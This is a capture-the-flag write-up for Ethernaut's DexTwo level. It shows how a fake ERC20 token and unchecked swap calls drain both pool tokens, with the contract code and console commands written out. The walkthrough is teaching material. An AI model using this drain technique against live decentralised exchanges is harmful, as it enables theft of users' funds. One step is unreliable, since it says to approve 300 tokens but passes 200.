# Level 23: Dex

This is the level 23 of OpenZeppelin [Ethernaut](https://ethernaut.openzeppelin.com/) web3/solidity based game.

## Pre-requisites
- [ERC20 Token Standard](https://eips.ethereum.org/EIPS/eip-20)

## Hack

Given contract:
```solidity
contract DexTwo  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_amount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_amount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(spender, amount);
    SwappableTokenTwo(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
```

`player` has to drain all of `token1` and `token2`.

The vulnerability here arises from `swap` method which does not check that the swap is necessarily between `token1` and `token2`. We'll exploit this.

Let's deploy a token - `EvilToken` in Remix, with initial supply of 400, all given to `msg.sender` which would be the `player`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract EvilToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("EvilToken", "EVL") {
        _mint(msg.sender, initialSupply);
    }
}
```
We're going to exchange `EVL` token for `token1` and `token2` in such a way to drain both from `DexTwo`. Initially both `token1` and `token2` is 100. Let's send 100 of `EVL` to `DexTwo` using `EvilToken`'s `transfer`. So, that price ratio in `DexTwo` between `EVL` and `token1` is 1:1. Same ratio goes for `token2`.

Also, allow `DexTwo` to transact 300 (100 for `token1` and 200 for `token2` exchange) of our `EVL` tokens so that it can swap `EVL` tokens. This can be done by `approve` method of `EvilToken`, passing `contract.address` and `200` as params.

Alright at this point `DexTwo` has 100 of each - `token1`, `token2` and `EVL`. And `player` has 300 of `EVL`.
```
      DEX             |      player  
token1 - token2 - EVL | token1 - token2 - EVL
---------------------------------------------
  100     100     100 |   10      10      300
```

Get token addresses:
```javascript
evlToken = '<EVL-token-address>'
t1 = await contract.token1()
t2 = await contract.token2()
```

Swap 100 of `player`'s `EVL` with `token1`:
```javascript
await contract.swap(evlToken, t1, 100)
```

This would drain all of `token1` from `DexTwo`. Verify by:
```javascript
await contract.balanceOf(t1, instance).then(v => v.toString())

// Output: '0'
```

Updated balances:
```
      DEX             |      player  
token1 - token2 - EVL | token1 - token2 - EVL
---------------------------------------------
  100     100     100 |   10      10      300
  0       100     200 |   110     10      200
```

Now, according to `get_swap_amount` method, to get all 100 of `token2` in exchange we need 200 of `EVL`. Swap accordingly:
```javascript
await contract.swap(evlToken, t2, 200)
```

And `token2` is drained too! Verify by:
```javascript
await contract.balanceOf(t2, instance).then(v => v.toString())

// Output: '0'
```

Finally:
```
      DEX             |      player  
token1 - token2 - EVL | token1 - token2 - EVL
---------------------------------------------
  100     100     100 |   10      10      300
  0       100     200 |   110     10      200
  0       0       400 |   110     110     0
```


Level passed!

_Learned something awesome? Consider starring the [github repo](https://github.com/theNvN/ethernaut-openzeppelin-hacks)_ 😄

_and following me on twitter [here](https://twitter.com/heyNvN)_ 🙏
